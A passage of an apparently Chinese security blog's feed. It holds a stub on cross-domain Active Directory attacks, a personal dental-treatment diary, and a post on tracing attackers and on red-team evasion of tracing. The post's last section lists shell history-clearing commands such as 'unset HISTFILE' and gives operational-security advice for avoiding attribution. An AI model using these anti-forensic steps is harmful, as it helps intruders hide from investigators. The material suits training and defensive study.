    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>内网中，一般通过域林进行资源共享。</p><p>逻辑隔离：根据不同的职能区分部门、划分主域和子域。</p><p>物理隔离：通过防火墙将各个子公司及各个部门划分为不同的区域。</p><p>为何必须要垮域来进行攻击？</p><blockquote><p>拿到了某个子域或者分公司的域控制器权限，但没有拿下整个公司内网的全部权限。或者是想要获得的资源不在当前拿下的这个域内。</p></blockquote><h1 id="常见的跨域攻击方法"><a href="#常见的跨域攻击方法" class="headerlink" title="常见的跨域攻击方法"></a>常见的跨域攻击方法</h1><ul><li>常规渗透方法（利用Web漏洞跨域拿Shell）</li><li>利用已知域散列值进行哈希传递、票据攻击（内网通用密码、密码存在一定规则、域控制器本地管理员密码可能相同）</li><li>利用域信任关系进行跨域攻击</li></ul><h2 id="利用域信任关系进行跨域攻击"><a href="#利用域信任关系进行跨域攻击" class="headerlink" title="利用域信任关系进行跨域攻击"></a>利用域信任关系进行跨域攻击</h2><p>域信任：解决多域环境中的跨域资源共享问题。域信任利用DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域，就不存在通过域信任关系进行跨域资源共享。</p><h4 id="域信任关系介绍"><a href="#域信任关系介绍" class="headerlink" title="域信任关系介绍"></a>域信任关系介绍</h4><p><strong>域信任关系分为单向信任和双向信任</strong>。</p><p>信任流和访问流。</p><p><strong>域信任关系也可以分为内部信任和外部信任</strong>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;内网中，一般通过域林进行资源共享。&lt;/p&gt;
&lt;p&gt;逻辑隔离：根据不同的职能区分部门、划分主域和子域。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>生活记录：我的口腔健康折腾之路</title>
    <link href="https://hack-for.fun/516f.html"/>
    <id>https://hack-for.fun/516f.html</id>
    <published>2021-02-24T10:48:28.000Z</published>
    <updated>2021-03-10T16:12:58.220Z</updated>
    
    <content type="html"><![CDATA[<p>希望能成功</p><a id="more"></a><h1 id="造孽"><a href="#造孽" class="headerlink" title="造孽"></a>造孽</h1><p>因为以前小时候，爱吃甜食，然后晚上不刷牙，导致我的牙齿健康就非常差，补牙补了很多个了，然后六龄牙是坏到了已经不能补的程度，就一直那样拖着……直到只剩下残根。</p><blockquote><p>六龄牙，即6号牙，一辈子只长一次。在6岁的时候开始发育长出。</p></blockquote><p>其次，我的上排牙齿，有两、三颗左右长的比较“尖”，就是没按正常的方式来长。下排牙齿，因为六龄牙的问题，左右5号牙没有旁边6号牙的支撑，长期受力作用下，往4号牙靠，导致下排牙齿整体看上去比较“倾斜”。</p><h1 id="费用记录"><a href="#费用记录" class="headerlink" title="费用记录"></a>费用记录</h1><p>挂号：11 *3 = 33元</p><p>查血：96元</p><p>拍牙片：160元</p><p>消炎药和麻醉药：11.20元</p><p>拔牙：314元</p><p>开始矫正：</p><p>第一次费用：2256.35元（矫正费用是分几次给的、然后补了一颗牙），矫正最后算下来差不多8k～12k吧。</p><h1 id="折腾记录"><a href="#折腾记录" class="headerlink" title="折腾记录"></a>折腾记录</h1><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>挂口腔科，医生会给你看牙齿情况，然后说大概方案。</p><p>A：有智齿，并且智齿情况良好。可以通过矫正的方式，将7号牙拖到6号牙，智齿替代7号牙。</p><p>B：无智齿，只能通过种植牙的方式来填补6号牙。</p><p>A、B方案，都需要矫正，矫正目的：长时间下6号牙缺失，导致上6号牙向下发育生长，需要通过矫正向上拉出空间，为种植牙提供空间。</p><p>所以，正好合适，矫正了牙齿也填补了6号牙的缺失。只是时间成本和金钱成本。</p><h2 id="查血（血常规、HIV、梅毒、乙肝）"><a href="#查血（血常规、HIV、梅毒、乙肝）" class="headerlink" title="查血（血常规、HIV、梅毒、乙肝）"></a>查血（血常规、HIV、梅毒、乙肝）</h2><p>  <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195803.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195843.png"></p><h2 id="拍牙片"><a href="#拍牙片" class="headerlink" title="拍牙片"></a>拍牙片</h2><p>拔牙和矫正前需要拍全景片和侧位片：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195157.png" alt="全景片"></p><p>从全景片也可以看出，上排牙齿的不整齐、还有下面两个6号牙的残根，以及无智齿这么一个情况。</p><p>上面有15颗牙齿（右边似乎多了一个牙齿，估计矫正的时候又要拔牙。）、下面有14颗牙齿（两颗6号牙残根也算进去了）</p><p>白色部分都是补过牙的部分，这不必多解释。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195210.png" alt="侧位片"></p><p>从侧位图可以看到，牙齿咬合面是没有对齐的，然后颈椎那里感觉似乎有点问题，但是明天上午就去排MRI了，去骨科检查下颈椎。</p><h2 id="拔牙"><a href="#拔牙" class="headerlink" title="拔牙"></a>拔牙</h2><p>先去拿药：</p><ul><li>消炎药</li><li>麻醉药</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195226.png"></p><p>吃了药，然后就去拔牙。拔牙先打麻药，过程小疼，问题不大。</p><p>下面的图片可能有点血腥，晕血患者请远离战场。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195135.png" alt="拔牙的装备"></p><p>在流血和麻醉的作用下， 两个6号牙都拔了下来。不上图了。</p><p>然后就是需要注意：</p><ul><li>拔牙后第一天不能刷牙、动静很大的漱口</li><li>不能吃常规的食物，最好吃流体</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195109.png"></p><h2 id="拆线"><a href="#拆线" class="headerlink" title="拆线"></a>拆线</h2><p>一周后就去拆线了，在有线的情况下，漱口有时候会感觉到小小的痛，但是没啥大问题。</p><p>拆线的过程很轻松，一点也不痛。</p><p>先是上碘伏给部位消毒，漱口，然后就开始拆线了。</p><p>没有任何疼痛感。</p><h2 id="取模"><a href="#取模" class="headerlink" title="取模"></a>取模</h2><p>拔了呀，因为我还要矫正，所以紧接着就取模了。</p><p>取模就会用一个硅胶似的东西，包在嘴里，最后出来的经过一系列操作就是模型。</p><p>此外，还会放一个镜片在嘴里，拍照，上下各一次。</p><p>然后还会拍照（正面、侧面、左右45度拍照），正常表情和露齿笑。</p><p>医生说我的什么，具体忘了叫啥了，似乎有点斜，然后又用了一根长的直尺类似的木片，让我咬着，然后拍照。</p><p>取模的过程中，似乎我的脑袋有点习惯性后倾。。。看来体态问题还很多。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210307151202.JPG"></p><p>就放一张图片吧。。牙缝比较大，容易卡东西，要经常漱口。</p><p>牙医说一个星期后就可以去做矫正了，因为这段时间是给她想方案的。</p><h2 id="全口矫正（2021-3-9）"><a href="#全口矫正（2021-3-9）" class="headerlink" title="全口矫正（2021-3-9）"></a>全口矫正（2021-3-9）</h2><p>矫正之前，右上6号牙又出问题了，把之前补的牙齿给重新补了一下。</p><p>……</p><p>……</p><p>……</p><p>然后就是开始矫正：</p><p>粘矫正器附着用的沟槽，然后就是穿钢丝，然后就是弄钢丝，再然后就是调整一下，看有没有咬合的时候存在冲突的地方。</p><p>弄完之后反正很难受，吃饭都不方便，咬东西都时候还疼。</p><p>然后就是差不多 每一个月左右就要去复诊一次吧。</p><hr><p>下面用来记录一下变化过程吧 哈哈哈，还是比较期待的。</p><p>（可能会引起不适，谨慎观看。</p><p>佩戴矫正器的第一天：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210311000820.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210311001025.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;希望能成功&lt;/p&gt;</summary>
    
    
    
    
    <category term="杂谈" scheme="https://hack-for.fun/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>如何防止溯源以及反溯源</title>
    <link href="https://hack-for.fun/49b7.html"/>
    <id>https://hack-for.fun/49b7.html</id>
    <published>2021-02-21T12:06:38.000Z</published>
    <updated>2021-04-03T03:02:08.360Z</updated>
    
    <content type="html"><![CDATA[<p>温故而知新。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222210541.png"></p><a id="more"></a><ul><li>资料均来自互联网以及个人整理，仅用作学习用途，禁止非法利用，详情《网络安全法》。</li><li>如有侵权，联系删除，感谢！</li></ul><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><blockquote><p>网络攻击溯源技术通过综合利用各种手段主动地追踪网络攻击发起者、定位攻击源，结合网络取证和威胁情报，有针对性地减缓或反制网络攻击，争取在造成破坏之前消除隐患，在网络安全领域具有非常重要的现实意义。</p></blockquote><p>攻击溯源技术，国外又被称为“Threat Hunting”，是为了应对外部APT攻击者和内部利益驱动的员工威胁而提出的一种解决方案。威胁狩猎[4]技术不被动地等待与响应，而是通过持续性监测技术，更早、更快地检测和发现威胁，并追踪威胁的源头。威胁狩猎技术强调用攻击者的视角来检测攻击，减少攻击者驻留时间，从而显著地改善组织的安全状况。放眼世界，包括FireEye等为代表的厂商以及越来越多的大型组织也开始进行威胁狩猎。</p><p>工具</p><p>安全分析师需要检查系统和网络上发生的历史操作记录和当前状态详细信息，因此需要依靠多种工具和数据源来协助溯源分析，常用的工具包括：</p><ol><li><p>安全监控工具：安全分析师使用不同来源的监控数据，例如防火墙、终端防护、网络入侵检测、内部威胁检测以及其他安全工具的监控数据，用以描绘驻留在网络中的攻击者所进行的活动。</p></li><li><p>可视化分析工具：帮助安全分析师通过使用交互式仪表板来实现复杂关系数据可视化，发现不同数据集之间的隐藏关联关系。</p></li><li><p>SIEM解决方案：SIEM解决方案从网络环境中的各种来源收集结构化日志数据，提供对数据的实时分析并向相关部门发出安全警报。SIEM解决方案可帮助安全分析师自动收集并利用来自安全监视工具和其他来源的大量日志数据，从而识别潜在安全威胁。</p></li><li><p>网络威胁情报：威胁情报提高了分析人员识别相关威胁并及时做出响应的能力，通过开源的威胁情报库实现信息交换，得到威胁分析所需的恶意IP地址、恶意软件哈希值等信息。</p></li><li><p>其他工具：一些特定功能的分析工具对攻击溯源也有很好的帮助，例如检查PDF操作、PowerShell操作等。</p></li></ol><hr><p>上面的说的太官方了，贴一个比较通俗易懂的。</p><p>被攻击后溯源：</p><blockquote><p>出现异常的时间点(非常重要)、异常服务器的主要业务情况、大致的一个网络拓扑是不是在DMZ区、是否可以公网访问、开放了那些端口、是否有打补丁、使用了怎么样的一个web技术、最近是否做过什么变更、有没有什么安全设备之类的。</p></blockquote><p>根据收集到的信息，往往可以得出了几种可能。一个web服务器公网可以访问出现了被挂黑链的事件使用了s2框架，那么初步可以怀疑是s2-045 s2-046之类的命令执行漏洞了；如果一台公网服务器没有安装补丁又没有防火墙防护，administrator的密码为P@sswrod那么有很大的可能性是被暴力破解成功；后面的工作主要就是收集各种资料证明这一猜想即可。</p><h2 id="攻击源捕获"><a href="#攻击源捕获" class="headerlink" title="攻击源捕获"></a>攻击源捕获</h2><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等<br> 日志与流量分析，异常的通讯流量、攻击源与攻击目标等<br> 服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等<br> 邮件钓鱼，获取恶意文件样本、钓鱼网站URL等<br> 蜜罐系统，获取攻击者行为、意图的相关信</p><h3 id="基于日志的溯源（Web-系统被攻击）"><a href="#基于日志的溯源（Web-系统被攻击）" class="headerlink" title="基于日志的溯源（Web 系统被攻击）"></a>基于日志的溯源（Web 系统被攻击）</h3><p>使用路由器、主机等设备记录网络传输的数据流中的关键信息(时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。</p><p>这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。</p><p>常见几个中间件的日志如下：</p><blockquote><p>1.apache的日志路径一般配置在httpd.conf的目录下或者位于/var/log/http</p><p>2.IIS的日志默认在系统目录下的Logfiles下的目录当中</p><p>3.tomcat 一般位于tomcat安装目录下的一个logs文件夹下面</p><p>4.Nginx日志一般配置在nginx.conf或者vhost的conf文件中</p><p>日志一般以日期命名，方便后续审计与安全人员进行分析。</p></blockquote><h3 id="主机系统、数据库系统"><a href="#主机系统、数据库系统" class="headerlink" title="主机系统、数据库系统"></a>主机系统、数据库系统</h3><p>Linux:</p><p>/var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等信息</p><p>/var/log/lastlog 记录登录的用户，可以使用命令lastlog查看</p><p>/var/log/secure 记录大多数应用输入的账号与密码，登录成功与否</p><p>/var/log/cron 记录crontab命令是否被正确的执行</p><p>Windows：</p><p>Windows平台下面的溯源就相对容易一些当然主要还是依靠windows的日志一般用 eventvwr命令打开事件查看器。默认分为三类：l应用程序、安全、性统 以evt文件形式存储%systemroot%\system32\config目录：</p><p><img src="https://image.3001.net/images/20190426/1556290560_5cc31c00740d8.png!small"></p><p>合理使用筛选器往往可以帮助我们更好的排查日志，比如怀疑是暴力破解入侵的筛选<strong>事件ID == 4625审核失败的日志，后续通过对时间的排查、以及源IP地址、类型与请求的频率进行分析来判断是否是来源于内网的暴力破解。</strong></p><p><img src="https://image.3001.net/images/20190426/1556290578_5cc31c126b0eb.png!small"></p><p>通过系统内部的日志来判断是否是恶意进程的运行状态。</p><p><img src="https://image.3001.net/images/20190426/1556290597_5cc31c251d176.png!small"></p><p>如下图是一个典型的SMB认证失败的情况：</p><p><img src="https://image.3001.net/images/20190426/1556290673_5cc31c715e3fb.png!small"></p><p>然后就是Windows 补丁了。</p><h3 id="路由输入调试技术"><a href="#路由输入调试技术" class="headerlink" title="路由输入调试技术"></a>路由输入调试技术</h3><p>在攻击持续发送数据，且特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在DDoS攻击追溯中比较有效，且网络开销较小。</p><h2 id="分析模型——杀伤链模型-amp-钻石模型"><a href="#分析模型——杀伤链模型-amp-钻石模型" class="headerlink" title="分析模型——杀伤链模型&amp;钻石模型"></a>分析模型——杀伤链模型&amp;钻石模型</h2><p>杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪(Reconnaissance)、武器构建(Weaponization)、载荷投递(Delivery)、漏洞利用(Exploitation)、安装植入(Installation)、通信控制(Command&amp;Control)、达成目标(Actions on Objective)等几个阶段。</p><p>钻石模型由网络情报分析与威胁研究中心(The Center for Cyber Intelligence Anaysis and Threat Research，CCIATR)机构的Sergio Catagirone等人在2013年提出。</p><p>该模型把所有的安全事件(Event)分为四个核心元素，即敌手(Adversary)，能力(Capability)，基础设施(Infrastructure)和受害者(Victim)，以菱形连线代表它们之间的关系，因而命名为“钻石模型”。</p><p>杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。</p><h2 id="关联分析方法"><a href="#关联分析方法" class="headerlink" title="关联分析方法"></a>关联分析方法</h2><p>关联分析用于把多个不同的攻击样本结合起来。</p><p>文档类（比如钓鱼，附件等。</p><ul><li>hash</li><li>ssdeep</li><li>版本信息(公司/作者/最后修改作者/创建时间/最后修改时间)</li></ul><p>行为分析</p><p>基于网络行为，类似的交互方式</p><p>可执行文件相似性分析</p><ul><li>特殊端口</li><li>特殊字符串/密钥</li><li>PDB文件路径<ul><li>相似的文件夹</li></ul></li><li>代码复用<ul><li>相似的代码片段</li></ul></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="bypass-师傅博客"><a href="#bypass-师傅博客" class="headerlink" title="bypass 师傅博客"></a>bypass 师傅博客</h3><p>案例一：邮件钓鱼攻击溯源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻防场景：攻击者利用社会工程学技巧伪造正常邮件内容，绕过邮件网关的查杀，成功投递到目标邮箱，诱骗用户点击邮件链接或下载附件文件。</span><br><span class="line">信息收集： 通过查看邮件原文，获取发送方IP地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息。</span><br><span class="line">溯源方式：第一种，可以通过相关联的域名&#x2F;IP进行追踪；第二种，对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息；第三种，通过对邮件恶意附件进行分析，利用威胁情报数据平台寻找同源样本获取信息，也能进一步对攻击者的画像进行勾勒。</span><br></pre></td></tr></table></figure><p>案例二：Web入侵溯源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻防场景：攻击者通过NDAY和0DAY漏洞渗入服务器网段，Webshell 触发安全预警或者威胁检测阻断了C&amp;C域名的通讯。</span><br><span class="line">溯源方式：隔离webshell样本，使用Web日志还原攻击路径，找到安全漏洞位置进行漏洞修复，从日志可以找到攻击者的IP地址，但攻击者一般都会使用代理服务器或匿名网络（例如Tor）来掩盖其真实的IP地址。</span><br><span class="line">在入侵过程中，使用反弹shell、远程下载恶意文件、端口远程转发等方式，也容易触发威胁阻断，而这个域名&#x2F;IP，提供一个反向信息收集和渗透测试的路径。</span><br></pre></td></tr></table></figure><p>案例三：蜜罐溯源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻防场景：在企业内网部署蜜罐去模拟各种常见的应用服务，诱导攻击者攻击。</span><br><span class="line">溯源方式：在攻击者入侵蜜罐时，蜜罐可以记录攻击者的入侵行为，获取攻击者的主机信息、浏览器信息、甚至是真实 IP及社交信息。</span><br></pre></td></tr></table></figure><h3 id="阿里云安全中心的案例"><a href="#阿里云安全中心的案例" class="headerlink" title="阿里云安全中心的案例"></a>阿里云安全中心的案例</h3><p>（其实是一个产品，不过这个图片思路值得学习）</p><ul><li>蠕虫传播事件</li></ul><p>下图描述了蠕虫传播源（例如：<code>185.234.*.*</code>）通过SSH暴力破解成功登录到服务器，并通过bash执行<strong>curl</strong>指令从远端下载挖矿程序并在服务器中执行该挖矿程序。</p><p><img src="https://static-aliyun-doc.oss-accelerate.aliyuncs.com/assets/img/zh-CN/0713029951/p45771.png"></p><ul><li>Web漏洞入侵事件</li></ul><p>下图描述了黑客通过服务器（例如：<code>202.144.*.*</code>）发起攻击，通过Web漏洞向Linux服务器植入恶意shell脚本和挖矿程序，同时将代码写入计划任务（<strong>crond</strong>）实现攻击持久化。您可以通过溯源页面的节点信息，清晰地了解这一过程。此外，还可以观察到攻击者的多个IP及恶意下载源URL信息。</p><p><img src="https://static-aliyun-doc.oss-accelerate.aliyuncs.com/assets/img/zh-CN/0713029951/p45773.png"></p><h3 id="由WebShell-溯源攻击者的入侵途径"><a href="#由WebShell-溯源攻击者的入侵途径" class="headerlink" title="由WebShell 溯源攻击者的入侵途径"></a>由WebShell 溯源攻击者的入侵途径</h3><p><a href="https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/">https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/</a></p><h1 id="反溯源（溯源反制）"><a href="#反溯源（溯源反制）" class="headerlink" title="反溯源（溯源反制）"></a>反溯源（溯源反制）</h1><h2 id="ip-定位技术"><a href="#ip-定位技术" class="headerlink" title="ip 定位技术"></a>ip 定位技术</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">根据IP定位物理地址—代理IP</span><br><span class="line"> 溯源案例：通过IP端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</span><br></pre></td></tr></table></figure><h2 id="id-追踪"><a href="#id-追踪" class="headerlink" title="id 追踪"></a>id 追踪</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID追踪术，搜索引擎、社交平台、技术论坛、社工库匹配</span><br><span class="line">溯源案例：利用ID从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</span><br></pre></td></tr></table></figure><h2 id="网站url"><a href="#网站url" class="headerlink" title="网站url"></a>网站url</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域名Whois查询—注册人姓名、地址、电话和邮箱。—域名隐私保护</span><br><span class="line"> 溯源案例：通过攻击IP历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</span><br></pre></td></tr></table></figure><p>但是一般技术人员应该都是静态博客吧，hexo 这些。</p><h2 id="恶意样本"><a href="#恶意样本" class="headerlink" title="恶意样本"></a>恶意样本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提取样本特征、用户名、ID、邮箱、C2服务器等信息—同源分析</span><br><span class="line">溯源案例：样本分析过程中，发现攻击者的个人ID和QQ，成功定位到攻击者。</span><br></pre></td></tr></table></figure><h2 id="社交账号"><a href="#社交账号" class="headerlink" title="社交账号"></a>社交账号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基于JSONP跨域，获取攻击者的主机信息、浏览器信息、真实 IP及社交信息等</span><br><span class="line"> 利用条件：可以找到相关社交网站的jsonp接口泄露敏感信息，相关网站登录未注销</span><br></pre></td></tr></table></figure><h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><p>攻击路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击目的：拿到权限、窃取数据、获取利益、DDOS等</span><br><span class="line">网络代理：代理IP、跳板机、C2服务器等</span><br><span class="line">攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</span><br></pre></td></tr></table></figure><p> 攻击者身份画像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">虚拟身份：ID、昵称、网名</span><br><span class="line">真实身份：姓名、物理位置</span><br><span class="line">联系方式：手机号、qq&#x2F;微信、邮箱</span><br><span class="line">组织情况：单位名称、职位信息</span><br></pre></td></tr></table></figure><h2 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h2><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222225526.png"></p><h3 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h3><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222225945.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222231625.png"></p><h2 id="防守组织架构"><a href="#防守组织架构" class="headerlink" title="防守组织架构"></a>防守组织架构</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222230535.png"></p><p>1、已知漏洞：演习之前，我们做了众测、红蓝对抗，发现了一些安全问题。相信这些问题，可能提前被某些攻击者已经掌握，于是将计就计，我们把这类漏洞做成诱饵。例如 shiro漏洞，springboot 的 actuator 监控等。</p><p>2、热门漏洞：今年演习一波三折，第一天爆出了几十个0day，何不将计就计？利用这些漏洞来做诱饵呢，配上一些历史域名、欺骗域名服用，效果更佳。例如用 vpn.b.cn 运行某服 VPN 程序。</p><p>3、产品特性：蜜罐厂家都有各自的特色。比如 A 家有Mysql 反制蜜罐，B家有RDP反制蜜罐，这些都可以合理搭配使用。</p><h2 id="溯源反制总结"><a href="#溯源反制总结" class="headerlink" title="溯源反制总结"></a>溯源反制总结</h2><p>参考：<a href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222234241.png"></p><h1 id="如何防止溯源（红队角度）"><a href="#如何防止溯源（红队角度）" class="headerlink" title="如何防止溯源（红队角度）"></a>如何防止溯源（红队角度）</h1><blockquote><p>前面两点都是蓝队角度。说说红队如何防止被溯源吧。</p></blockquote><p>任何需要认证的地方，不用自己真实的，也不用任何和公司有关的名词。</p><p>任何需要交互操作的地方，都需要挂上全局代理，尽量不用暴露自己的真实ip，其次，警惕蜜罐，就那种看起来都多漏洞的站点，直接访问跳到后台，然后admin、123456就进去这种，稍微注意一下。</p><p>任何服务器，C2、文件服务器，扫描器，都要特殊用途特殊操作。</p><p>不开无用端口。</p><p>即：匿名性、专业性、精细化</p><hr><blockquote><p>别信所谓的绝对无后门，只不过是你发现不了。</p><p>很多神器没有办法自己开发也只能将就着用</p><p>所以我们为了避免信息泄露重</p><p>要文件绝对不能放在攻击机上。</p></blockquote><p>（1）所有工作均在虚拟机进行</p><p>（2）流量统一经网关走VPN进出</p><p>（3）不同需求分配不同虚拟机</p><p>（4）文件独立</p><p>（5）全盘加密&amp;拒绝弱密码</p><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>真实APT的话，那肯定是高匿名性的。但是作为演习，一般就行了。</p><ol><li>线路匿名</li></ol><p>（1）网络接入点匿名</p><p>（2）途径节点匿名且加密</p><p>（3）使用的公网服务器匿名</p><ol start="2"><li>网络接入点匿名</li></ol><h2 id="安全操作恶习"><a href="#安全操作恶习" class="headerlink" title="安全操作恶习"></a>安全操作恶习</h2><p>（1）图省事物理机连VPN直接搞</p><p>这种情况基本意味着你没啥匿名可言</p><p>而且一般这么做的人</p><p>各种黑客软件也是直接在物理机运行。</p><p>妥妥的成别人肉鸡，还是会自觉上线的那种。</p><p>简直萌萌哒</p><p>（2）账户混用</p><p>比如在项目A中用了一个匿名邮箱</p><p>或者其他什么账户。</p><p>在项目B中继续使用。</p><p>这样的话有关机构很容易</p><p>根据这个邮箱把你的足迹关联起来</p><p>由B挖出A，可能你在B项目中其他都做得很好</p><p>没给别人机会追查你，但是</p><p>项目A由于是你早期做的项目</p><p>漏洞百出，给了他们追查你的机会。</p><p>（3）公私不分</p><p>最常见的就是随手把项目截图之类的东西</p><p>经由私人账户发到QQ微信</p><p>此外还有用私人邮箱，</p><p>手机号发送文件和信息。接收验证码之类。</p><p>（4）留特征值，这点多见于自写工具</p><p>（5）电脑不关机就离开</p><p>（6）黑页</p><p>（7）密码通用</p><p>（8）早期目标调研的时候用真实IP去访问</p><h2 id="反蜜罐"><a href="#反蜜罐" class="headerlink" title="反蜜罐"></a>反蜜罐</h2><p>有插件、也可以自己判断是否为蜜罐。</p><p>最好的方式是把浏览器中的登录记录给删点。或者是在虚拟机中操作。</p><h2 id="清除日志方式"><a href="#清除日志方式" class="headerlink" title="清除日志方式"></a>清除日志方式</h2><ul><li><code>kill &lt;bash process ID&gt;</code> 不会存储</li><li><code>set +o history</code> 不写入历史记录</li><li><code>unset HISTFILE</code> 清除历史记录的环境变量</li></ul><p>还有更多。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://help.aliyun.com/document_detail/99611.html">https://help.aliyun.com/document_detail/99611.html</a></p><p><a href="https://www.secrss.com/articles/26264">https://www.secrss.com/articles/26264</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13817637.html">https://www.cnblogs.com/xiaozi/p/13817637.html</a></p><p><a href="https://websec.readthedocs.io/zh/latest/defense/forensic.html">https://websec.readthedocs.io/zh/latest/defense/forensic.html</a></p><p><a href="https://www.freebuf.com/articles/network/202168.html">https://www.freebuf.com/articles/network/202168.html</a></p><p><a href="https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/">https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/</a></p><p><a href="https://zhuanlan.zhihu.com/p/26217643">https://zhuanlan.zhihu.com/p/26217643</a></p><p><a href="https://www.anquanke.com/post/id/197104">https://www.anquanke.com/post/id/197104</a></p><p><a href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;温故而知新。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222210541.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>免杀学习：静态恶意代码逃逸</title>
    <link href="https://hack-for.fun/bd13.html"/>
    <id>https://hack-for.fun/bd13.html</id>
    <published>2021-02-20T02:52:10.000Z</published>
    <updated>2021-02-20T15:30:57.125Z</updated>
    
